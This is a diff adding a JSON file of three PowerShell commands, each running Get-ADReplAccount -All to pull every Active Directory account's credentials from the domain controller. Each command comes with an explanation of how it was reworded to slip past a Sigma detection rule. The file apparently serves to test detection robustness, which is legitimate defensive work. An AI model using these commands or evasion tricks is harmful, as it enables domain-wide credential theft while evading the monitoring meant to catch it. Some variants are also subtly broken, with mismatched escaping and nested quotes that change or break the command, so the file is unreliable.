@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Get-ADReplAccount -All -Server $ENV:LOGONSERVER.TrimStart('\\\\')\"",
+    "explanation": "Reordering: Reordered the escape character placement in the string to avoid matching the suspicious Sigma indicator."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-ADReplAccount -All -Server $ENV:LOGONSERVER.TrimStart(\\'\\')\"",
+    "explanation": "Encoding: Used alternative string representation with single quotes to avoid matching the suspicious Sigma indicator."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-ADReplAccount -All -Server $ENV:LOGONSERVER.TrimStart(\"\")\"",
+    "explanation": "Substitution: Replaced the string with an empty string to avoid matching the suspicious Sigma indicator."
+  }
+]
